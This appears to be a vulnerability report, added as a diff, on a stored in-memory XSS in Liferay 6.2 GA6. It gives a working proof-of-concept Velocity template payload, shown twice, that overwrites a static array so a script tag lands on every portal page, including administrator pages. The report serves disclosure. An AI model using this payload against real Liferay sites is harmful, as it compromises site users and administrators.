@@ -1,0 +1,40 @@
+Unsafe template object leads to stored in-memory xss.
+
+The attacker can use the template Object staticFieldGetter to change "public static final *[]" arrays. Final public arrays are modifiable, only the reference of an array is final. If an final public array is not null oder empty, than the attacker can change all fields. 
+
+
+Stored im-memory xss example:
+
+1. Use liferay 6.2 GA6
+
+2. Create a Velocity template with this content:
+
+$staticFieldGetter.getFieldValue("com.liferay.portal.kernel.util.StringPool","ASCII_TABLE").set(47,'/favicon.ico" rel="Shortcut Icon" /><script>alert(1)</script> <link href="')
+
+3. Run template e.g. using webcontent view.
+
+As a result stored xss occurs an every portal site, including all administrator pages. Changing in-memory objects is dangerous. I think more attacks are possible e.g. privilege escalation or even remote code execution.
+
+
+-------------------------------------------------------------------------
+
+
+http://freemarker.org/docs/ref_builtins_expert.html
+
+
+$staticFieldGetter.getFieldValue("com.liferay.portal.kernel.util.StringPool","ASCII_TABLE").set(47,'/favicon.ico" rel="Shortcut Icon" /><script>alert(1)</script> <link href="')
+
+
+
+____________________________________________________________________________
+
+funktioniert: 
+
+${staticFieldGetter.getFieldValue('com.liferay.portal.kernel.util.StringPool','ASCII_TABLE')[47]}
+
+
+com/liferay/portal/service/base/PrincipalBean.java:	public static final String[] ANONYMOUS_NAMES = {
+
+
+
+https://issues.liferay.com/browse/LPS-72675
